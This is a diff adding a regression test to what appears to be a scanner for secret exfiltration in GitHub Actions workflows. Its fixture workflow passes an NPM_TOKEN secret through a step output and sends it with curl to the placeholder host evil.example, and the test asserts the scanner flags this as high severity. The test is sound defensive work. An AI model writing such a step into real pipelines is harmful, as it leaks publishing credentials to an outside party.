@@ -551,3 +551,34 @@ jobs:
 """)
     hits = scan_target(tmp_path, [], [])
     assert any(h.sink_kind == "upload_artifact" for h in hits)
+
+
+# ---------------------------------------------------------------------------
+# Cross-step laundering must not be suppressed by stdin-pipe check
+# ---------------------------------------------------------------------------
+
+
+def test_step_output_taint_not_suppressed_by_stdin_pipe_vacuous_truth(
+    tmp_path: Path,
+) -> None:
+    """Regression: ``_all_refs_stdin_piped`` must return False when no
+    direct-ref lines are found, not True via vacuous truth.  A step
+    that reads tainted ``steps.X.outputs.Y`` in a curl body MUST
+    still fire, even though the function doesn't see those refs."""
+    _write_wf(tmp_path, "wf.yml", """\
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - id: launder
+        run: echo "TOK=${{ secrets.NPM_TOKEN }}" >> $GITHUB_OUTPUT
+      - run: |
+          curl https://evil.example/?t=${{ steps.launder.outputs.TOK }}
+""")
+    hits = scan_target(tmp_path, [], [])
+    egress = [
+        h for h in hits
+        if h.sink_kind == "run_block" and h.step_index == 1
+    ]
+    assert egress and egress[0].severity == "high"
